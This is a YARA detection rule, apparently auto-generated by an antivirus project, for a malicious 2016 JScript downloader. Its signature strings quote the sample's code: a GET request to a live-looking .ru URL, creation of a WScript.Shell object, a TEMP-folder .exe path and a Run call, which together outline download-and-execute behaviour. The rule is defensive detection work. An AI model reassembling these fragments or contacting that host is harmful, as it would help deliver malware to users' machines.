rule sig_20160330_2b248c1a2692f7ecf67daca8296929f1 {
  meta:
    description = "datamaliciousorder - file 20160330_2b248c1a2692f7ecf67daca8296929f1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c3ca6d555dae0c75b931b1b2e3eba79ce8b54518d76f3985d73fbb6b32706a72"

  strings:
    $s1  = "function K(LX, I0){X = X * 1; return LX - I0;};" fullword ascii
    $s2  = "BA[D](\"GET\", \"http://zakaz-sharikov.ru/x9dslp\", false);" fullword ascii
    $s3  = "var G = function SM() {return WScript[VU](\"WScript\"+\".Shell\");}(), Z = 11;" fullword ascii
    $s4  = "if (BA[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function Y(){return B + \"\";};" fullword ascii
    $s6  = "function N() {return G[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"1SPHdpfKPYkE1ABe.ex\" + \"e\";};" fullword ascii
    $s7  = "function M(ZF){G[\"Run\"](ZF, X, X);};" fullword ascii
    $s8  = "function VV() {return ((LO == true) && (LO == TG)) ? 1 : X;};" fullword ascii
    $s9  = "function UU(){return 22;};" fullword ascii
    $s10 = "function R()" fullword ascii
    $s11 = "return K(HJ, I);" fullword ascii
    $s12 = "}while (EA);" fullword ascii
    $s13 = "var MX = new this[\"Date\"]();" fullword ascii
    $s14 = "function E(EE) {var N0 = (1, 2, 3, 4, 5, EE); return N0;};" fullword ascii
    $s15 = "function MO(){return VU;};" fullword ascii
    $s16 = "var C = false;" fullword ascii
    $s17 = "LO = true; " fullword ascii
    $s18 = "var LO = false;" fullword ascii
    $s19 = "TG = true; " fullword ascii
    $s20 = "var TG = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}